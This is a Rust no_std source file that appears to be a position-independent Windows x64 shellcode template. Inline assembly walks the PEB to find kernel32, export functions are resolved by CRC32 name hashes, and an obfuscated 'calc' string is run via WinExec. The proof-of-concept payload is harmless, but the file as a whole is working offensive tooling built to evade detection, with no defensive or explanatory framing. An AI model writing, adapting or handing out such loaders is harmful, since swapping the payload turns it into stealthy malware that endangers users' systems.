#![cfg(not(test))]
#![no_std]
#![no_main]
#![allow(non_snake_case, non_camel_case_types)]
#![allow(non_camel_case_types)]
pub type c_char = i8;
pub type HMODULE = isize;
pub type HWND = isize;
pub type DWORD = u32;
pub type WORD = u16;
#[repr(C, packed(2))]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}
#[repr(C)]

pub struct IMAGE_EXPORT_DIRECTORY {
    pub Characteristics: u32,
    pub TimeDateStamp: u32,
    pub MajorVersion: u16,
    pub MinorVersion: u16,
    pub Name: u32,
    pub Base: u32,
    pub NumberOfFunctions: u32,
    pub NumberOfNames: u32,
    pub AddressOfFunctions: u32,
    pub AddressOfNames: u32,
    pub AddressOfNameOrdinals: u32,
}

pub type IMAGE_DIRECTORY_ENTRY = u16;

pub const IMAGE_DIRECTORY_ENTRY_EXPORT: IMAGE_DIRECTORY_ENTRY = 0u16;
pub type IMAGE_FILE_MACHINE = u16;
pub type IMAGE_FILE_CHARACTERISTICS = u16;

#[repr(C)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: IMAGE_FILE_MACHINE,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: IMAGE_FILE_CHARACTERISTICS,
}

pub type IMAGE_OPTIONAL_HEADER_MAGIC = u16;
pub type IMAGE_SUBSYSTEM = u16;
pub type IMAGE_DLL_CHARACTERISTICS = u16;
#[repr(C)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}
#[repr(C, packed(4))]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: IMAGE_OPTIONAL_HEADER_MAGIC,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: IMAGE_SUBSYSTEM,
    pub DllCharacteristics: IMAGE_DLL_CHARACTERISTICS,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

// #[no_mangle]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
use core::arch::asm;
use core::{ffi::c_void, ptr::null_mut};


pub fn get_fun_from_module_with_crc(ModuleBase: HMODULE,crc:u32) -> *mut c_void {


    let DOS_HEADER: *const IMAGE_DOS_HEADER = ModuleBase as *const _;
    debug_assert!(!DOS_HEADER.is_null());
    debug_assert!(DOS_HEADER.is_aligned());
    let DOS_MAGIC: u16 = unsafe { (*DOS_HEADER).e_magic };
    assert_eq!(DOS_MAGIC, 0x5A4D);
    let NT_HEADER: *const IMAGE_NT_HEADERS64 =
        unsafe { (DOS_HEADER as *const u8).add((*DOS_HEADER).e_lfanew as usize) as *const _ };
    debug_assert!(!NT_HEADER.is_null());
    debug_assert!(NT_HEADER.is_aligned());
    debug_assert_eq!(unsafe { (*NT_HEADER).Signature }, 0x4550);
    let OPTHEADER: *const IMAGE_OPTIONAL_HEADER64 = unsafe { &(*NT_HEADER).OptionalHeader };
    debug_assert!(!OPTHEADER.is_null());
    debug_assert!(OPTHEADER.is_aligned());
    debug_assert_eq!(unsafe { (*OPTHEADER).Magic }, 0x20B);
    let pExport: *const IMAGE_EXPORT_DIRECTORY = unsafe {
        (ModuleBase as *const u8).add(
            (*OPTHEADER).DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress
                as usize,
        ) as *const _
    };

    debug_assert!(!pExport.is_null());
    debug_assert!(pExport.is_aligned());
    let base = unsafe { (*pExport).Base } as usize;
    let pAddOfFun_Raw: *const DWORD = unsafe {
        (ModuleBase as *const u8).add((*pExport).AddressOfFunctions as usize) as *const _
    };
    debug_assert!(!pAddOfFun_Raw.is_null());
    debug_assert!(pAddOfFun_Raw.is_aligned());

    let pAddOfOrd_Raw: *const WORD = unsafe {
        (ModuleBase as *const u8).add((*pExport).AddressOfNameOrdinals as usize) as *const _
    };
    debug_assert!(!pAddOfOrd_Raw.is_null());
    debug_assert!(pAddOfOrd_Raw.is_aligned());
    let pAddOfNames_Raw: *const DWORD =
        unsafe { (ModuleBase as *const u8).add((*pExport).AddressOfNames as usize) as *const _ };

    for i in 0..unsafe { (*pExport).NumberOfFunctions } {
        let name = unsafe {
            (ModuleBase as *const u8).add(pAddOfNames_Raw.add(i as usize).read() as usize)
                as *const c_char
        };
        if compare_raw_cstr_crc(name, crc){
            let ordinal = unsafe { pAddOfOrd_Raw.add(i as usize).read() as usize };
            let rva = unsafe { pAddOfFun_Raw.add(ordinal - base + 1).read() as usize };
            let result = (ModuleBase as usize + rva) as *mut c_void;
            return result;
        } else {
            continue;
        }
    }

    return null_mut();
}
fn compare_raw_cstr_crc(p1: *const c_char, crc: u32)-> bool{
    let mut length = 0;
    unsafe {
        // 计算 C 字符串的长度
        let mut temp_ptr = p1;
        while *temp_ptr != 0 {
            temp_ptr = temp_ptr.add(1);
            length += 1;
        }
    }
    
    // 从原始指针创建一个切片
    let slice = unsafe { core::slice::from_raw_parts(p1 as *const u8, length) };
    CRC(slice) == crc
}

#[cfg(not(target_feature="sse4.2"))]
fn CRC(data: &[u8]) -> u32 {
    let mut crc = 0;
    for byte in data {
        crc ^= *byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0x82F63B78;
            } else {
                crc >>= 1;
            }
        }
    }
    crc 
}
#[cfg(target_feature="sse4.2")]
fn CRC(data: &[u8]) -> u32 {
    use core::arch::x86_64::*;

    let mut crc: u32 = 0; // CRC 初始值
    for &byte in data {
        crc = unsafe { _mm_crc32_u8(crc, byte) };
    }
    crc // 返回最终的 CRC 值
}



#[no_mangle]
pub extern "C" fn main() -> () {
    let mut kernel32_base_address: u64;
    unsafe {
        asm!(
            "xor rax, rax",
            "mov rax, gs:[0x60]", // 64位系统中，PEB位于GS:0x60
            "mov rax, [rax + 0x18]", // PEB->Ldr
            "mov rax, [rax + 0x20]", // Ldr->InLoadOrderModuleList.Flink (第一个条目)
            "mov rsi, [rax]", // 指向第二个模块（通常是ntdll.dll）
            "mov rsi, [rsi]", // 指向第三个模块（可能是kernelbase.dll或kernel32.dll，取决于系统和配置）
            "mov rax, rsi",
            "mov rax, [rax + 0x20]", // 获取模块基址，64位系统中偏移量是0x20
            "mov {0}, rax",
            out(reg) kernel32_base_address,
            options(nostack)
        );
    }
    // let GetProcAddress: extern "system" fn(HMODULE, *const c_char) -> usize = unsafe {
    //     core::mem::transmute(get_fun_from_module_with_crc(
    //         kernel32_base_address as _,
    //         0x35c1f38c,
    //     ))
    // };

    // let LoadLibrary: extern "system" fn(*const c_char) -> HMODULE = unsafe {
    //     core::mem::transmute(get_fun_from_module_with_crc(
    //         kernel32_base_address as _,
    //         0xda2df7b,
    //     ))
    // };


    let mut lpFile = [b'c' + 4, b'a' + 3, b'l' + 2, b'c' + 1, 0];
    core::hint::black_box({
        for i in 0..4 {
            lpFile[i] -= (4-i) as u8;
        }
    });

    let WinExec: extern "system" fn(*const c_char, i32) -> i32 = unsafe {
        core::mem::transmute(get_fun_from_module_with_crc(
            kernel32_base_address as _,
            0x4a0786a0,
        ))
    };
    WinExec(lpFile.as_ptr() as *const c_char, 0);

}

#[no_mangle]
fn rust_eh_personality() {}

